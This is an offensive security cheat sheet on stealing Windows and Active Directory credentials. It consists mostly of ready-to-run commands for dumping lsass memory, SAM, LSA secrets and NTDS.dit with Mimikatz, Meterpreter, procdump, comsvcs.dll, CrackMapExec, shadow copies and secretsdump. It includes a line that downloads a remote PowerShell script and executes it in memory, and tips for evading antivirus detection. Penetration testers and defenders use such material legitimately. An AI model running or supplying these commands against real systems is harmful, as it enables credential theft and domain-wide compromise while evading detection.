# Stealing Credentials

## Credentials Mimikatz

```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"
```

**Find other things that Mimikatz can do in** [**this page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"'
```

[**Learn about some possible credentials protections here.**](credentials-protections.md) **This protections could prevent Mimikatz from extracting some credentials.**

## Credentials with Meterpreter

Use the [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **that** I have created to **search for passwords and hashes** inside the victim.

```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::sam"
```

## Bypassing AV

### Procdump + Mimikatz

As **Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**is a legitimate Microsoft tool**, it's not detected by Defender.   
You can use this tool to **dump the lsass process**, **download the dump** and **extract** the **credentials locally** from the dump.

{% code title="Dump lsass" %}
```bash
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
{% endcode %}

{% code title="Extract credentials from the dump" %}
```c
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
{% endcode %}

This process is done automatically with [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Note**: Some **AV** may **detect** as **malicious** the use of **procdump.exe to dump lsass.exe**, this is because they are **detecting** the string **"procdump.exe" and "lsass.exe"**. So it is **stealthier** to **pass** as an **argument** the **PID** of lsass.exe to procdump **instead o**f the **name lsass.exe.**

### Dumping lsass with **comsvcs.dll**

There’s a DLL called **comsvcs.dll**, located in `C:\Windows\System32` that **dumps process memory** whenever they **crash**. This DLL contains a **function** called **`MiniDumpW`** that is written so it can be called with `rundll32.exe`.  
The first two arguments are not used, but the third one is split into 3 parts. First part is the process ID that will be dumped, second part is the dump file location, and third part is the word **full**. There is no other choice.  
Once these 3 arguments has been parsed, basically this DLL creates the dump file, and dumps the specified process into that dump file.  
Thanks to this function, we can use **comsvcs.dll** to dump lsass process instead of uploading procdump and executing it. \(This information was extracted from [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/)\)

```text
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```

We just have to keep in mind that this technique can only be executed as **SYSTEM**.

**You can automate this process with** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

## CrackMapExec

### Dump SAM hashes

```text
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

### Dump LSA secrets

```text
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

### Dump the NTDS.dit from target DC

```text
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

### Dump the NTDS.dit password history from target DC 

```text
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```

### Show the pwdLastSet attribute for each NTDS.dit account

```text
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```

## Stealing SAM & SYSTEM

This files should be **located** in _C:\windows\system32\config\SAM_ and _C:\windows\system32\config\SYSTEM._ But **you cannot just copy them in a regular way** because they protected.

### From Registry

The easiest way to steal those files is to get a copy from the registry:

```text
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

**Download** those files to your Kali machine and **extract the hashes** using:

```text
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```

### Volume Shadow Copy

You can perform copy of protected files using this service. You need to be Administrator.

#### Using vssadmin

vssadmin binary is only available in Windows Server versions

```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

But you can do the same from **Powershell**. This is an example of **how to copy the SAM file** \(the hard drive used is "C:" and its saved to C:\users\Public\) but you can use this for copying any protected file:

```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```

Code from the book: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

Finally, you could also use the [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) to make a copy of SAM, SYSTEM and ntds.dit.

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```

## **Active Directory Credentials - NTDS.dit**

**The Ntds.dit file is a database that stores Active Directory data**, including information about user objects, groups, and group membership. It includes the password hashes for all users in the domain.

The important NTDS.dit file will be **located in**: _%SystemRoom%/NTDS/ntds.dit_  
This file is a database _Extensible Storage Engine_ \(ESE\) and is "officially" composed by 3 tables:

* **Data Table**: Contains the information about the objects \(users, groups...\)
* **Link Table**: Information about the relations \(member of...\)
* **SD Table**: Contains the security descriptors of each object

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows uses _Ntdsa.dll_ to interact with that file and its used by _lsass.exe_. Then, **part** of the **NTDS.dit** file could be located **inside the** _**lsass**_ **memory** \(you can find the lastet accessed data probably because of the performance impruve by using a **cache**\).

#### Decrypting the hashes inside NTDS.dit

The hash is cyphered 3 times:

1. Decrypt Password Encryption Key \(**PEK**\) using the **BOOTKEY** and **RC4**.
2. Decrypt tha **hash** using **PEK** and **RC4**.
3. Decrypt the **hash** using **DES**.

**PEK** have the **same value** in **every domain controller**, but it is **cyphered** inside the **NTDS.dit** file using the **BOOTKEY** of the **SYSTEM file of the domain controller \(is different between domain controllers\)**. This is why to get the credentials from the NTDS.dit file **you need the files NTDS.dit and SYSTEM** \(_C:\Windows\System32\config\SYSTEM_\).

### Copying NTDS.dit using Ntdsutil

Available since Windows Server 2008.

```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```

You could also use the [**volume shadow copy**](./#stealing-sam-and-system) ****trick to copy the **ntds.dit** file. Remember that you will also need a copy of the **SYSTEM file** \(again, [**dump it from the registry or use the volume shadow copy**](./#stealing-sam-and-system) ****trick\).

### **Extracting hashes from NTDS.dit**

Once you have **obtained** the files **NTDS.dit** and **SYSTEM** you can use tools like _secretsdump.py_ to **extract the hashes**:

```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

You can also **extract them automatically** using a valid domain admin user:

```text
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

For **big NTDS.dit files** it's recommend to extract it using [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Finally, you can also use the **metasploit module**: _post/windows/gather/credentials/domain\_hashdump_ or **mimikatz** `lsadump::lsa /inject` 

## Lazagne

Download the binary from [here](https://github.com/AlessandroZ/LaZagne/releases). you can use this binary to extract credentials from several software.

```text
lazagne.exe all
```

## Other tools for extracting credentials from SAM and LSASS

### Windows credentials Editor \(WCE\)

This tool can be used to extract credentials from the memory. Download it from: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Extract credentials from the SAM file

```text
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```

### PwDump

Extract credentials from the SAM file

```text
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```

### PwDump7

Download it from:[ http://www.tarasco.org/security/pwdump\_7](%20http://www.tarasco.org/security/pwdump_7) and just **execute it** and the passwords will be extracted.

## Defenses

\*\*\*\*[**Learn about some credentials protections here.**](credentials-protections.md)\*\*\*\*

